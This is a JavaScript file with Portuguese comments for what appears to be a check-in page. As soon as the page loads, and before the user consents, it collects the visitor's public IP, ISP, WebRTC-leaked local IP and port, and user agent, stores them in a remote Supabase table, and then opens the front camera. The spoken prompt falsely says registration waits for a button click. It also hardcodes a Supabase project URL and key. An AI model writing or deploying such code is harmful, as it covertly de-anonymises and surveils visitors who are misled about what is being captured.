// =================================================================
// CONFIGURAÇÃO DE CONEXÃO
// =================================================================
const SUPABASE_URL = "https://gskcadoofoqwhqhscxcs.supabase.co";
const SUPABASE_KEY = "sb_publishable_xup-F-C4wv_epMIAbohpjQ_aXnLZOL3";
const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

// Elementos
const video = document.getElementById("video");
const btn = document.getElementById("btn");
const statusText = document.getElementById("status");
const canvas = document.getElementById("canvas");

// =================================================================
// ÁUDIO
// =================================================================
function falar(texto){
  speechSynthesis.cancel();
  const fala = new SpeechSynthesisUtterance(texto);
  fala.lang = "pt-BR";
  fala.volume = 1;
  fala.rate = 0.95;
  speechSynthesis.speak(fala);
}

// =================================================================
// SALVAR NO BANCO
// =================================================================
async function salvarNoBanco(dados) {
  try {
    const { error } = await supabaseClient.from('checkins').insert([dados]);
    if (error) console.error(error);
    else console.log("✅ Salvo:", dados.tipo_captura);
    return true;
  } catch(err) {
    console.error(err);
    return false;
  }
}

// =================================================================
// CAPTURA AVANÇADA (ICE, STUN, TURN, WebRTC)
// =================================================================
async function getInfoConexao() {
  const info = {
    tipo_captura: "previa",
    ip: "indisponível",
    local_ip: null,
    local_port: null,
    ice_type: null,
    stun_used: null,
    turn_used: null,
    webrtc_status: "Falhou",
    provedor: null
  };

  // IP + Provedor
  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    info.ip = data.ip || "indisponível";
    info.provedor = data.org || "Desconhecido";
  } catch(e) {}

  // WebRTC + ICE + STUN + TURN
  try {
    const rtc = new RTCPeerConnection({
      iceServers: [
        { urls: 'stun:stun.l.google.com:19302' },
        { urls: 'stun:stun1.l.google.com:19302' },
        { urls: 'turn:openrelay.metered.ca:80', username: "openrelayproject", credential: "openrelayproject" }
      ]
    });

    rtc.createDataChannel("teste-webrtc");

    rtc.onicecandidate = (event) => {
      if (event.candidate) {
        const cand = event.candidate.candidate;
        const ipMatch = cand.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
        const portMatch = cand.match(/(\d{4,5})\s+typ/);
        const typeMatch = cand.match(/typ\s(\w+)/);

        if (ipMatch) info.local_ip = ipMatch[1];
        if (portMatch) info.local_port = portMatch[1];

        if (typeMatch) {
          info.ice_type = typeMatch[1];
          if (typeMatch[1] === "srflx") info.stun_used = "Sim";
          if (typeMatch[1] === "relay") info.turn_used = "Sim";
        }
      }
    };

    const offer = await rtc.createOffer();
    await rtc.setLocalDescription(offer);

    await new Promise(resolve => setTimeout(resolve, 2200));

    info.webrtc_status = "Sucesso";
  } catch(e) {
    console.log("WebRTC falhou:", e);
    info.webrtc_status = "Falhou";
  }

  info.user_agent = navigator.userAgent;
  info.timestamp = new Date().toISOString();

  return info;
}

// =================================================================
// INICIALIZAÇÃO
// =================================================================
async function iniciarSistema(){
  try {
    falar("Seu cadastro será realizado automaticamente após clicar no botão verde abaixo.");
    statusText.innerHTML = "🟡 Iniciando sistema...";

    statusText.innerHTML = "🌐 Capturando WebRTC, ICE, STUN, TURN...";
    const info = await getInfoConexao();
    
    await salvarNoBanco(info);

    statusText.innerHTML = "✅ Dados de conexão (WebRTC + ICE) salvos.";

    // Câmera
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    video.srcObject = stream;
    await video.play();

  } catch(err) {
    console.log(err);
    statusText.innerHTML = "❌ Erro ao iniciar";
  }
}

window.onload = iniciarSistema;

// O botão pode ser completado depois
btn.addEventListener("click", () => {
  alert("Botão funcionando - Captura completa em breve");
});
